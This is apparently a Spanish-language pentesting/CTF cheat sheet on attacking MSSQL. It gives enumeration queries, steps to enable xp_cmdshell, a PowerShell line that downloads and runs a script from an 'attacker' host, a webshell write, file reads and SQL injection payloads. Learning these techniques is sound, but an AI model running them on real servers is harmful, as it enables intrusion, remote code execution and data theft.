# MSSQL

---

MSSQL (SQL Server)

SQL Server de Microsoft es muy común en entornos corporativos. Tiene funciones avanzadas como xp_cmdshell para ejecutar comandos del sistema, OPENROWSET para leer archivos y sp_executesql para inyecciones dinámicas.
Conexión básica (cliente sqlcmd o SQL Server Management Studio)
bash

sqlcmd -S servidor -U usuario -P contraseña

Enumeración del sistema
Consulta	Propósito
SELECT @@VERSION	Versión de SQL Server y SO
SELECT DB_NAME()	Base de datos actual
SELECT USER_NAME()	Usuario actual
SELECT HOST_NAME()	Nombre del equipo
SELECT * FROM sys.databases	Lista todas las bases de datos
SELECT * FROM sys.tables	Tablas (en base actual)
SELECT * FROM sys.columns	Columnas
SELECT * FROM information_schema.tables	Alternativa estándar
Ejecución de comandos del sistema

La joya de MSSQL es xp_cmdshell, pero generalmente está deshabilitada. Para habilitarla (si eres sysadmin):
sql

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

Luego ejecutar cualquier comando:
sql

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'type C:\flag.txt';
EXEC xp_cmdshell 'powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';

Si xp_cmdshell no está disponible, existen alternativas:

    sp_OACreate, sp_OAMethod (crear objetos COM, como WScript.Shell)

    xp_regread / xp_regwrite (leer/escribir registro)

    OPENROWSET (leer archivos)

Lectura de archivos con OPENROWSET
sql

SELECT * FROM OPENROWSET(BULK 'C:\path\file.txt', SINGLE_BLOB) AS x;

Útil para extraer flags o archivos de configuración.
Escritura de archivos (webshell)
sql

DECLARE @cmd VARCHAR(8000);
SET @cmd = 'echo "<% response.write(""hello"") %>" > C:\inetpub\wwwroot\shell.asp';
EXEC xp_cmdshell @cmd;

Inyección SQL en MSSQL

    Comentarios: -- (espacio después), /* */

    Concatenación: + (ej: SELECT 'user' + ':' + password FROM users)

    Unión: UNION SELECT NULL, NULL...

    Time‑based: WAITFOR DELAY '0:0:5'

Ejemplo de extracción de nombres de tablas:
sql

' UNION SELECT name, NULL FROM sysobjects WHERE xtype='U' -- 

Extraer columnas:
sql

' UNION SELECT name, NULL FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- 

Enumeración de usuarios y roles
sql

SELECT name, is_srvroleadmin FROM sys.server_role_members;
SELECT name, principal_id FROM sys.database_principals;

Extensión xp_dirtree (listar directorios)
sql

EXEC xp_dirtree 'C:\inetpub', 1, 1;

¿Por qué es útil en hacking?

    Si encuentras una inyección SQL en una web corporativa, es muy probable que el back‑end sea MSSQL.

    xp_cmdshell da RCE completa como el usuario del servicio SQL Server (a menudo SYSTEM o NT AUTHORITY\NETWORK SERVICE).

    MSSQL tiene un dialecto diferente; conocer sus funciones específicas (como WAITFOR DELAY en lugar de SLEEP()) es clave para tiempo ciego.

    Enumeración con sysobjects y syscolumns es un clásico en CTFs que simulan entornos Windows

